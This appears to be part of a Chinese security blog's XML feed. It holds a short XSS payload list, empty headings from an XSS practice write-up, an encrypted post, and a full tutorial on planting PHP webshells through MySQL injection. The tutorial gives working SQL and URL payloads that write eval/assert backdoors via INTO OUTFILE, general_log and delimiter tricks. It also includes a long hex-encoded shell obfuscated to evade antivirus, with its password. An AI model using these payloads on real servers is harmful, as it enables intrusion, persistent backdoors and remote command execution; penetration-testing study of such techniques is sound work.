title="分析"></a>分析</h3><h3 id="payload-15"><a href="#payload-15" class="headerlink" title="payload"></a>payload</h3><h2 id="Well"><a href="#Well" class="headerlink" title="Well"></a>Well</h2><h3 id="源码-16"><a href="#源码-16" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-16"><a href="#分析-16" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-16"><a href="#payload-16" class="headerlink" title="payload"></a>payload</h3><h2 id="No"><a href="#No" class="headerlink" title="No"></a>No</h2><h3 id="源码-17"><a href="#源码-17" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-17"><a href="#分析-17" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-17"><a href="#payload-17" class="headerlink" title="payload"></a>payload</h3><h2 id="K’Z’K"><a href="#K’Z’K" class="headerlink" title="K’Z’K"></a>K’Z’K</h2><h3 id="源码-18"><a href="#源码-18" class="headerlink" title="源码"></a>源码</h3><h3 id="分析-18"><a href="#分析-18" class="headerlink" title="分析"></a>分析</h3><h3 id="payload-18"><a href="#payload-18" class="headerlink" title="payload"></a>payload</h3><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;靶场地址：&lt;a href=&quot;https://alf.nu/alert1&quot;&gt;alert(1) to win&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;W</summary>
      
    
    
    
    <category term="WEB" scheme="http://lvpsectime.github.io/categories/WEB/"/>
    
    
    <category term="XSS" scheme="http://lvpsectime.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>XSS_payload收集</title>
    <link href="http://lvpsectime.github.io/post/63039.html"/>
    <id>http://lvpsectime.github.io/post/63039.html</id>
    <published>2020-05-02T12:22:34.000Z</published>
    <updated>2020-05-02T12:31:54.330Z</updated>
    
    <content type="html"><![CDATA[<p><strong>XSS弹cookie</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(docment.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>XSS弹用户信息</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(navigator.userAgent)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><strong>参考</strong></p><p><a href="https://github.com/pgaijin66/XSS-Payloads">https://github.com/pgaijin66/XSS-Payloads</a></p><p><a href="https://www.kitploit.com/2018/05/xss-payload-list-cross-site-scripting.html">https://www.kitploit.com/2018/05/xss-payload-list-cross-site-scripting.html</a></p><p><a href="https://www.jianshu.com/p/01377ad556f0">https://www.jianshu.com/p/01377ad556f0</a></p><p><a href="https://github.com/ismailtasdelen/xss-payload-list">https://github.com/ismailtasdelen/xss-payload-list</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;XSS弹cookie&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/p</summary>
      
    
    
    
    <category term="WEB" scheme="http://lvpsectime.github.io/categories/WEB/"/>
    
    
    <category term="XSS" scheme="http://lvpsectime.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>MySql注入点写webshell</title>
    <link href="http://lvpsectime.github.io/post/23798.html"/>
    <id>http://lvpsectime.github.io/post/23798.html</id>
    <published>2020-04-29T11:27:37.000Z</published>
    <updated>2020-04-29T13:11:41.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过<code>mysql</code>插入一条<code>php</code>代码记录输出到<code>http</code>服务器工作目录下，通过<code>url</code>传参来交给<code>php</code>系统命令函数来执行获取返回结果，若权限等足够可以直接创建新的账号密码来远程登录</p><p>可以先查看一下<code>mysql</code>的能写的文件 <code>secure_file_priv</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &#x27;%secure%&#x27;;</span><br><span class="line">secure_file_priv的值为null，表示限制mysqld不允许导入/导出</span><br><span class="line">secure_file_priv的值为D:/，表示限制mysqld的导入/导出只能发生在D盘目录下</span><br><span class="line">secure_file_priv没有具体值时，表示不对mysqld的导入/导出做限制</span><br></pre></td></tr></table></figure><h2 id="select-…-into-outfile"><a href="#select-…-into-outfile" class="headerlink" title="select … into outfile"></a>select … into outfile</h2><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>对<code>web</code>目录有写权限</li><li><code>GPC</code>关闭(<code>GPC</code>：是否对单引号转义)</li><li>有绝对路径(读文件可以不用，写文件需要)</li><li>没有配置<code>secure-file-priv</code></li></ul><h3 id="姿势"><a href="#姿势" class="headerlink" title="姿势"></a>姿势</h3><ul><li>有<code>union</code></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php assert($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/home/wwwroot/default/shell.php&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>无<code>union</code></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">into</span> outfile <span class="string">&#x27;/home/wwwroot/default/shell.php&#x27;</span> fields terminated <span class="keyword">by</span> <span class="string">&#x27;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="general-log"><a href="#general-log" class="headerlink" title="general_log"></a>general_log</h2><p>新版本的<code>MySQL</code>设置了导出文件的路径，很难在获取<code>Webshell</code>过程中去修改配置文件，无法通过使用<code>select into outfile</code>来写入一句话。这时，我们可以通过修改<code>MySQL</code>的<code>log</code>文件来获取<code>Webshell</code>。</p><h3 id="使用条件-1"><a href="#使用条件-1" class="headerlink" title="使用条件"></a>使用条件</h3><ul><li>对<code>web</code>目录有写权限</li><li><code>GPC</code>关闭(<code>GPC</code>：是否对单引号转义)</li><li>有绝对路径(读文件可以不用，写文件需要)</li><li>需要能执行多行SQL语句</li></ul><h3 id="姿势-1"><a href="#姿势-1" class="headerlink" title="姿势"></a>姿势</h3><h4 id="常用方式"><a href="#常用方式" class="headerlink" title="常用方式"></a>常用方式</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%general%&#x27;</span>;             #查看配置</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log <span class="operator">=</span> <span class="keyword">on</span>;                 #开启general log模式</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;E:/study/WWW/evil.php&#x27;</span>; #设置日志目录为shell地址</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_GET[g]);?&gt;&#x27;</span>             #写入shell</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span>off;                  #关闭general log模式</span><br></pre></td></tr></table></figure><h4 id="免杀shell"><a href="#免杀shell" class="headerlink" title="免杀shell"></a>免杀shell</h4><p>一句话webshell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> &quot;&lt;?php $p = array(&#x27;f&#x27;=&gt;&#x27;a&#x27;,&#x27;pffff&#x27;=&gt;&#x27;s&#x27;,&#x27;e&#x27;=&gt;&#x27;fffff&#x27;,&#x27;lfaaaa&#x27;=&gt;&#x27;r&#x27;,&#x27;nnnnn&#x27;=&gt;&#x27;t&#x27;);$a = array_keys($p);$_=$p[&#x27;pffff&#x27;].$p[&#x27;pffff&#x27;].$a[2];$_= &#x27;a&#x27;.$_.&#x27;rt&#x27;;$_(base64_decode($_REQUEST[&#x27;cmd&#x27;]));?&gt;&quot;</span><br></pre></td></tr></table></figure><p>创建数据表，写入webshell后删除数据表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> `mysql`.`antian365` (`temp` TEXT NOTNULL );</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `mysql`.`antian365` (`temp` ) <span class="keyword">VALUES</span>(<span class="string">&#x27;&lt;?php @eval($_POST[antian365]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> `temp` <span class="keyword">FROM</span> `antian365` <span class="keyword">INTO</span> OUTFILE<span class="string">&#x27;D:/www/antian365.php&#x27;</span>;</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> IF <span class="keyword">EXISTS</span> `antian365`;</span><br></pre></td></tr></table></figure><p>select unhex(‘十六进制字符串’) into dumpfile file_path，密码==&gt;pp64mqa2x1rnw68</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> unhex(<span class="string">&#x27;203C3F7068700D0A24784E203D2024784E2E737562737472282269796234327374725F72656C6750383034222C352C36293B0D0A246C766367203D207374725F73706C697428226D756B3961773238776C746371222C36293B0D0A24784E203D2024784E2E73756273747228226C396364706C616365704172424539646B222C342C35293B0D0A246A6C203D2073747269706F732822657078776B6C3766363674666B74222C226A6C22293B0D0A2474203D2024742E737562737472282274514756325957774A63567534222C312C36293B0D0A2465696137203D207472696D28226A386C32776D6C34367265656E22293B0D0A2462203D2024622E73756273747228226B6261736536346B424474394C366E6D222C312C36293B0D0A246967203D207472696D28226233397730676E756C6922293B0D0A2479203D2024792E24784E28227259222C22222C22637259726572596122293B0D0A24797531203D207374725F73706C697428226269316238376D3861306F3678222C32293B0D0A2474203D2024742E24784E282278413678222C22222C2277784136786F4A463922293B0D0A246E64203D2073747269706F7328226E363574383872786E303265646A336630222C226E6422293B0D0A2462203D2024622E24784E282277493339222C22222C225F774933396477493339656322293B0D0A2468387073203D207374725F73706C697428226B6E396A3968346D6877676633666A6970222C33293B0D0A2479203D2024792E7375627374722822687974655F66756E775669535645344A222C322C36293B0D0A24796637203D207374726C656E282275656875343967367467356B6F22293B0D0A2474203D2024742E24784E28226670222C22222C22516670546670314E667022293B0D0A246D39203D207374726C656E282265756C363034636F626B22293B0D0A2462203D2024622E73756273747228226C3057316F64656C413165536E454A222C342C33293B0D0A2468306277203D207472696D28226E33653568306371746F6B76676F6238747822293B0D0A2479203D2024792E24784E28227962222C22222C2263796274696F22293B0D0A24733761203D20727472696D2822617565627963396734743564386B22293B0D0A2474203D2024742E7375627374722822624D73306E4268383355577964222C392C34293B0D0A2464353971203D2073747269706F732822636A7675636B6F79357766336F746561222C226435397122293B0D0A2479203D2024792E73756273747228226E4439487851534C386E6752222C392C31293B0D0A246C31203D207374725F73706C697428226167717130396762716E31222C34293B0D0A2474203D2024742E24784E282277366F34222C22222C2277634477366F345977366F343022293B0D0A247079203D2073747269706F7328226C677938687472727631746333222C22707922293B0D0A2474203D2024742E24784E282265503332222C22222C22625846655033326822293B0D0A2478703364203D2073747269706F732822756B6C306E626E7839677433222C227870336422293B0D0A2474203D2024742E7375627374722822696B4A3030484A4D6E677863222C372C35293B0D0A2464743262203D207374726C656E282265346135616275616A7733766C6369726122293B0D0A2474203D2024742E737562737472282263644E314B78656D35334E776D456838364253222C372C34293B0D0A2475626A203D207374726C656E28227767686A6E6674326F70356B7831633038367422293B0D0A2474203D2024742E73756273747228226D34616F7864756A676E58536B63784C344657635964222C372C36293B0D0A247178203D207374726C656E2822726C71666B6B6674726F3867666B6F37796122293B0D0A2474203D2024742E7375627374722822723779222C312C31293B0D0A246D75203D20727472696D28226E676478777578357671653122293B0D0A246A203D2024792822222C20246228247429293B0D0A24626E6C70203D207374726C656E28227675667930616B316679617622293B0D0A24736468203D207374725F73706C69742822776D6E6A766733633770306D222C34293B0D0A246D62203D206C7472696D28226E353270317067616570656F6B6622293B0D0A2465307077203D20727472696D28227575346D686770356339706E613465677122293B0D0A24756768203D207472696D282272637064336F3977393974696F3922293B0D0A246772636B203D207374726C656E2822783572697835627031786B793722293B0D0A24656F3674203D207374726C656E282264646931683134656375797563376422293B246A28293B0D0A2464766E71203D207374725F73706C6974282270726D36676968613176726F333630346175222C38293B0D0A24756738203D20727472696D28226563387735327375706234767538656F22293B0D0A24726374203D2073747269706F73282268786536776F37657764386D65376474222C2272637422293B0D0A24656B7166203D207374725F73706C69742822707266357930386538666C6666773032356A38222C38293B0D0A24767972203D207374725F73706C69742822756D706A63737266673668356E64366F3435222C39293B0D0A24777266203D20727472696D282266797839396F3739333868377567716822293B0D0A24713134203D207374726C656E2822746334366F73786C3173743169633222293B0D0A66756E6374696F6E206F2820297B2020207D3B0D0A24757366203D207374726C656E2822666C7463707862377466626A736D7422293B0D0A3F3E&#x27;</span>) <span class="keyword">into</span> dumpfile <span class="string">&#x27;D:/WEB/IPTEST/22.php&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="利用分隔符写shell"><a href="#利用分隔符写shell" class="headerlink" title="利用分隔符写shell"></a>利用分隔符写shell</h2><p>当MySQL注入点为盲注或报错，<code>union select</code>写入的方式显然是利用不了的，那么可以通过分隔符写入。<code>Sqlmap</code>的<code>--os-shell</code>命令所采用的就是这种方式。</p><h3 id="使用要求"><a href="#使用要求" class="headerlink" title="使用要求"></a>使用要求</h3><ul><li><code>secure_file_priv</code>支持<code>web</code>目录文件导出</li><li>对<code>web</code>目录有写权限</li><li>有绝对路径</li></ul><h3 id="姿势-2"><a href="#姿势-2" class="headerlink" title="姿势"></a>姿势</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 LIMIT 0,1 INTO OUTFILE &#x27;E:/study/WWW/evil.php&#x27; lines terminated by 0x20273c3f70687020406576616c28245f504f53545b27636d64275d293b3f3e27 --</span><br></pre></td></tr></table></figure><p>同样的技巧，一共有四种形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1 INTO OUTFILE &#x27;绝对路径&#x27; lines terminated by  （一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;绝对路径&#x27; fields terminated by （一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;绝对路径&#x27; columns terminated by （一句话hex编码）#</span><br><span class="line">?id=1 INTO OUTFILE &#x27;绝对路径&#x27; lines starting by    （一句话hex编码）#</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;通过&lt;code&gt;mysql&lt;/code&gt;插入一条&lt;code&gt;php&lt;/code&gt;代码记录输出到&lt;code&gt;http&lt;/code&gt;服务器工作目</summary>
      
    
    
    
    <category term="WEB" scheme="http://lvpsectime.github.io/categories/WEB/"/>
    
    
    <category term="webshell" scheme="http://lvpsectime.github.io/tags/webshell/"/>
    
    <category term="MySql" scheme="http://lvpsectime.github.io/tags/MySql/"/>
    
  </entry>
  
  <entry>
    <title>端口漏洞备忘录</title>
    <link href="http://lvpsectime.github.io/post/39451.html"/>
    <id>http://lvpsectime.github.io/post/39451.html</id>
    <published>2020-04-28T02:17:19.000Z</published>
    <updated>2020-04-28T08:50:06.118Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b44148c008002f3555f087dd30bd8a1a6ca42e2634d18d9c9b6fc54a99325870">94818f561542136a5f12a1f20ba90f292e0141e737a79a2bb981a8f8e0b2601ba014e992787d963f774b5849166132ab56af3a642e04b3a17edddcb56e8496204bc48970161d0a5a24df890478cf18dc916f68f63172c5f099610861adbba16f097f97326954bf97af80dd0cae3cbad2521e11c9c4d53994dd00c5400f28a0b667aa90e8e9ee8377b9fd11e265b110afcc0a69bc65d26493a7fcd3bef66a7cc694bef93c2b8d0cdeb8255217b0520adde37068cd52e99dac84f216c94cf18dcad3fc5159038903d776c2e5792b9461f9e9e3f5d499058c265836d09e61fff4bb9cca01f4f14d43525a32531489da006f5d991b8f87d806ee2e17b1c506aaa0921de424b326e01dc8b06f96058370a0786dffc5ec8d74416aca5a7cdf0203055f8a089a2a543910d9ad19e50485459957d71a361e581435208c63be5aad4a1b3fe7175ea79f7c57a5905f50a340bf62869f407c32d10abfa041b627fb89d64749581e1ebb9aab2dfa7b0bebcc85a728770f4233f1d2aa2a51b060ea689bcdbdba3a346f85ef87523ac009904e0b1d3b932216fb8dec6db7e70582a75870056e5e591c3f5d8bcaeb5b2b434af3dac1d7de0a565b844fb907b23f4e834afaafa8b5212df15db90d8beaa80fb47bc221518e7c1897126eb44cc87b1aa2ce0c23f64dc8fc01da0e78027f7dce157538a19ce51857950da49c5b122e04f37597902f21e52d999872a0ccf516e6da53c06c76aaecf5e7865ba3375c16c202c66c3678ce1d059f83f3b4b999eb9775670d811008cf516ef1bbdf7a38c0bb12d340ffd55d84ec077cc53bc30dd50cf0d92919302ba7a6cd59614f1c08131848338e982fcb4c7d1ac3346aa309631b763c73edfc83bdf5fcb4885f4815697cfffc7ed4566f244785e31fe800e36aec3d545edfe1393a750c73ed1b53caf209f6e5cfe68124365692add6a56a4b6eb5c6f3f23c8f0cc17dbc19cd496bb0fa7034db6abf80de79352761858daaeeecc284b10b560b06b74627d2fb915c8d6e5e353dd6150173538c0ead5274031eb4996b7fa45f1de42ef342634be567dde3f4b287e232a14668d8840f197473dc2582acb0670d4833ed083249efca028d91cd9705cd584e82e5acdc98189e1e2880ac22c50f67c60a98b47bc1d6145cc4e14da5dd734e7756700db4e6e1b4215bb50dc318d4e476c635c3463df09b31a033dcaa1c06c128c2cd094b246c91334e642ea0a7f9ffdb84107a39da58d03295a91bd87356420561e9868621eedffb08508b2d57e879374b70c568f193ada25c3a9250dc480407ef140d80d47f7349c6895508605d76cf6f43792743faf4346b98e18f72d2d4cd856ab3f471a19a8d5190af205e242539160ecdf3234b8b744bc1c20741bff1775a9800f35b20ee5373c3613dcd00e3d42e563d906df7387411999be12831f8db284c35dded3a8a90a03848420c0cdfb0ecc27f9fcc866e7968e7d59566e3932ed8d72dbe6239465827c7bf50d79e8eac3415772d1515546b6d2e51fce1eac57130c580a9666439239105108ae234c8cfa7b6037b75f1569899f27f17bc0675f93854bac839d60379f68d2819c5d7ab48d64fa4387877ed1fefa6719819e8c858f3a6d7a783413ebfe7e5ec53bc307b51e96d0e6a51ac3ccc424edf08fdc74c8462ffe352f8c8d7925c76949a18103cdf8d3cd6c9073f7b7ed4f282b3259f36251b7bc1c98c12aefb2afaeb7ded022b676d119ba2c312ffbd26a9eeef98cf7ef4b70e1d12bdadf954fc2853278b3ea66141f0836de033d7238dd75b67b6b40c7365d3fdf0c37b72bc5fddc5e7ee3bc9ece79a7b46d1e685c967b9e07b8be5c1f4e55f9e55b7ab17c4ed226f3efe1ddb2a8fc8bb7b5b3de76d12438ce1962b338230a81d5f5d744ef9209fc39094a75fd58b8aafefb8a5549cc804fedca2f425afdc19df13176bf1e5cebbc3d2136571331a412e4f899537045051632b7b84c356f1e46a6769ac721f113b350908c41470c5b30f1d8b91d4eaac33fad878bd6422bed5ca7f73571686d947b68a7e422c95088e078035ccb8d2bb171139a4b6a5860c43215d98693bdecb9d3c9069094b8426a2054423e1c0b8d65c16cd732dd7a3b598c0cf36c49dd7aa37dc87e70e3bf53cb5a599e709fda9f93c379216dccc25c136b88a9aab039d5006a4957abf3722a04cc4a1e6cec38dc694996f212e1f8ea025a565aa47b435bce9b22e805a891298a53ec3aeef896c389e76ff80090649b9077ba53dee4c0d08c917c4ea6940a0164560d58593571ecdc40a150569fcd0f46c749521e39a355da6551e9da10782884e833f59b2f4896ccbe33b63cebc44f479f0eb3121d5a0d415526407345cc5827a5ca0433abd880eeadd5e6d062dff520e207f11d329b382cc8321a02058b8137758bd9161327b266a417c94f620029d041cc9d37a0be63f42af3f7745054ee11b340fecc6c56c65cb884e07bea548ffa08ee5719c4ebb2fa6c05d3f85bf92e70b468c9d13882f8024b0b017cb7bb249b938bbfa1fc8500fdbf26196ac205888159f1b92e52163d1ee13c02784767b6377a9bf3ce01347e00d2dafea939f386bd374961e3b0eb8e53d072b6abde83cf5d6cfcf3d4f5dace57d66d4c60fe81d6dd7077415f44170b91bd08d33ebcb31355caa5c2b02a8130bce52c6ec8b4d11a4999d71245d9422a0ab5bd07b7414170934d9e5d20c9d980ee3d2da5735be5215dc7c3373d52a6ebab8db62160b681bd88d4927cba2dfc25e5bb280cfb71f9583e97aa1283ff65090f57e3270d007eab315610ded584f66af4d76f2f8ee09fb584b515d83cc3465ea761e0ccc2def278c9b80c64de6a9781109ef7f9232292a278a3eaaeda32b630dc0ed235f7a25fe322b99102ab8e557fe1d1768be1dfe5079bc2eac4b7f7b5d858fc8dd35d0088bc0ddf252a210da657eafa82cb28ca5d435b1410867d513ca83e001b57b929ba7f771c79dee9a29d7d17c8ac592680b26c3c71c5af7d266211c8e2433d35103b9778534cfc2f0b78afe256fabef8b93c65185bd444b4df78feb423fc52d4f92b26455a880fda2350b2370a714ae03a87acef236bf86b944338d104a5748f7c51cc65c5121893c45211cf32def11836c1f29ada494556571bc9d9632455a37b73b6507bceec5a09d094fe0399fc0d088e8b694b2e33e70f95d72ec6731b704cb6044ac3fed62fb21f696a5456f561cd07448734d0e2ce8ad7bcd5fadeb7ef7fad93401ba3ceea1829369eb800b5be54d1e944f86f9b276de9b35e3f14c632871e2a64f63523dd6bdd27c997bd5b44e958b598ded1d6ba4d6de78926173d85382b72f3cae957a4ea97df502623e129be7a3e975ba405b5e7d1ea08c1d17aea287f4533fd340615ac7efde1def76b619b4f7b2fd8fd41048abc427c9a796bec464fcdf0ab2acb05ded0660b09dfb9496936a2a597f9f139722d7614ef455c1e4202e806828427b3d07343e0609782803f521fd22d0a3c435d7bc8ed5c18a588a6b4e8bb5316ea653929b60b5e3b8ba8cf13336405417ba51ba2f08a91136baeba5ec070017d08af9abe20d92013e4c04c4568ba507d42b31c1e3da0fd72b96531411a64ab943dd7f09cbec5a5194603445408a28b2b6761f12c7d1c5e5684d8faa978cdb500b5ce815b530e97b7e68acd8aad69ef8627936f2f06abea62a13767c4befc6a5a255c7ee7fa9e1083ea0fdf6c557c9bceb96b26b4994c7cae472d10e6a9763277dc27dd5542ea5793d920b4a32863384cd99656a2ad8da5fcfd67e792a12c950c4d977fd7a9f7395735dcfabe0a7374eca692612edd4e9f5e9f24d4cd82f80cf44134cd47589bf416f881410e5e95ffffc5baaf8451623cecd10a80cb9ab38be1beb2e9cb73ffe0fe2c0a26ce9ba036ac6e97b3b7973469e0ea409758c5f0cebfd49ff96844c9e03be77799b4924e64233716997cfefe5b2cae34eae2e948985e8e397c164ee5fc294537cadc9c0cf88839a931165d282a9514e3a84438a60d62913d814c5a3247593435259977d0113e5655d570a841d7dbad4aa499d578bce1111771f2f2fdb9b618d66515f2128be8c259fdd607e3b230f5a151c88e3d1b33b7dcc773c36e905ba1a4cdb378189a01047c0ae8405931b172ee85bd2604617d36633bbbcba287deee388f1bb3970a5330db6392cccc24911fb762e55eaccd5191a43bf61607774749402e59be3548ef3c0727bb24192767c1e5cdd082bb64af51da2f36f07fe4702bb489bb60ddc537a86adde669b9c0a61aa6b4bc90b90bad46c80c10154e4694b1c47635eb915009adbf4b1537efe3481f0b0df14420c9eaae6074ab2d9afe6aa85c62baa9e39e576557fed7628ad86b9a9a1eec7085c9cd75eaaea3a4343ef5d8667a2cfe3e7793b0d479487df99ab1a9011ca052aad2843088a68b30c6eaefd7443699ef3ac4e59e0883a874e9a1d7a5245ca7db865fe8b03022848823a07e3a474f28f307116288e084b2368adcb83b1d726fac656e9cc8c4b5d4968735ab1719fb9245f37d6514196738bb2d50a14ccd82fb893f34b861aa390e5d8c1ae5eb07ac05555c434621cc4ad7a1cc1c07199015a5aef6583183afafd57431ab5f5ec259d9a282f5fb462f5d02c1582b7d31de1cfc0027784785fcf7f42ba08b85ad1ba3c5f5e04847acc92c58cfd2cd5541c868b3cc4c898354232667234137c33957a386360aea1fca152568223cfe84a39ac37f4ecba1c80419945e51ebb4a53429feb0bf4ccf593d3c0d7e4e2e77da7d3903871b2dec67fd254b510e8c7ace1b99232ea6a24f72f2d4c3772b34a6c1a702dc8666ccaad84e4688173108c542a10360799ad00eeef7843d9010607492f46be2f123964c9abae5fca279fb5113825c108365a59da6288c491a2e460b4da20726b0af90a01f3894371023f71ee66d28d5ddd67120a2757b0ba0a0ff91617532a33b44ae0827a97a822cd9b0f94801c8252f2ad937f93451bfa8ec475a0adf2d113efda7822d4d7a465a646f8c2d43a7cf2e71be09a2e826e0059738f54bc6258e6dd0ec4b4189ba8d23c11f9c4bd478827f1021f1f5a69b003de77b0c61ffe2441e0e13d38a8b383fc3965a7e435cee1f47602b29e9374087ed327d3e190c42587f931ad2c39b231d487a2435e3f31cb7cc493b68f0e10afff26ac78df7cf30494645caf5241a6846bd2296f120a8abf1cfe02a37f40d168747eeb3b2d8e6820afcf78bd1d809c6097ca15a2d3000607b8840290cc0c85d29fcc498ad8b7e71b4a29ac8c14fe5cdf387071922dd075eb3fc329f11a82add93c9d3bc1d0ab7bd96b504ec5e0f5d60580130d85934d142271992e3a6851b8b248fc747c02d2d71592ebf4e12fc3ceedb30f31b076abddc7899ec73e31be77017fa1b3f357c1eab1e0c2e163005e2bb09189c68e3e021dbcab0675f2e430fa0f3adfc3947c7c0decffa2ddb5fb166852773ce21805884b87ee619c50eb2916f346faa7f8685c947cd38d3b85d9b977932c36d3ac679b6a0625077d7164f43dbcdb2eb1de592f1aaec9808ec90aee6b6275d840ece61fe152760f811eb874fad5450356d987e4771fa79e7ecef422ad7e860b791c0b1dbf86c3b5eeed0b4f506453d8a7c57915186554600f27acce89d1eba45a322a1058d894cf4730a16ad5797f141a7cd6debb3c56b5994f6f309c0519842ddb85182af42b0e88d8778d92853bc2e449666aac35336a45381a912d9f1cb199f4aab1531c3f903e32f992d7b58156bca9e11eb7ec933cce2deb46dac2610a67dc873aebf4c6f58732669a309d9e3a34a8a0bce99588d8f4a763ea2b6435e4c57aac06a5e533bd7bfa9136310be7c9db1dc80efa06250bf3674902e74d483b180f2e87ecc1910a039d3f02de6ff62310a23e5e32420294db7f276b51906f6dc82407c72438e73558f1cca8698ab498bc6080cf70eada114b9d075102465c5f381f7bb2e51c7410c11e2804272b30df549222b006ed915eb96ec63ce4b0ba2ff22a838cfcc7a5363070626d96c1762c9ef2bb0be1f564c98881c5fdefde8bc9db696d54011a770bbeba3f6a07908abe14f55c8f3f654bb5f5f80166fd71b653e98a7cbdc339c90294b42f1d23249ec7437f4c7d921e5942976bdbef8d238fb950450e641fe5be61e5fb30d2c5bd1fbef85c873c37eb6ce9a23d344e0b03d2741252ecc08074416e27a3f926031b574bbc71d097100c0a2d8111e113856159214719602cda7951e0615d1e0f1e2131835759519b46d65140e7b52043a03a69bce57e8e2ef1becda276f69f25b9e63c65383e769e63d84968e8a28a2d2d4ecf8d095cd28544cf89556e0f427644376babd2ae6d8e4a31bd27b8e28f3ee5e4a05f708aeb58328ce8f086d892a303f861e6f6cf5c71d609a423d062de7449895783d2ad8bc71c349deebbbcbecd76035a6591fa0ca214540dfbdf1586085c3b59d1e5dadbc16d6338bfcfaf77a16bbccc186d92f60bf9cdf9124948693bc4c1313e101b515cc7474be20bb29af94b486b36e9ce794e075ab8f42d91a0c22861752fdb372a23711e00a889bd82c5c70483c44cb2ef2f8d6252c30d36c9f95c0b9d278c263e7cce005c9f1e7614bde2ec2bf5a8adb98db4d4269ea56e0682fda431260b11fce735a6dbf378b89fc45c6636bedadf42ac8765758d385b31ac6929dbbcbfa2bbbcc3f94ff6a845fbe1b3ab5fb868e0040a61c7c085ba94c5c478b1ca3f13adf0e41bb0d12eedf45e06082009ba6dcd577d24521580dba9983f09e7c7aca74cb8deb4fd82ce93d15ceb79eaaee197191973985d3406000ca69e8574f84df58dd646ae068fee91a26057b9af8d3963e826a40b058b192309823a76793be3b8ed62e556a34e4a3322b0c2c70d9c968479a98742e2f882fad1de12869b7d96465ec512cb8aafc2641d3d29cf156a68a1c173a4dee078350033adc047604dc18a4ace47600972fab2be6f10aff469b21f75e60a2c7b9edbe3f017caf6a4f17cef2a2b286da13aaf21d4f74a00b017594e57d8d5dfa6471aeff6afe4adf42e837422742a582a2a7c54b6a967338c87095c1e4b62788be9ab40ad811e2f3dcdfc648324a2e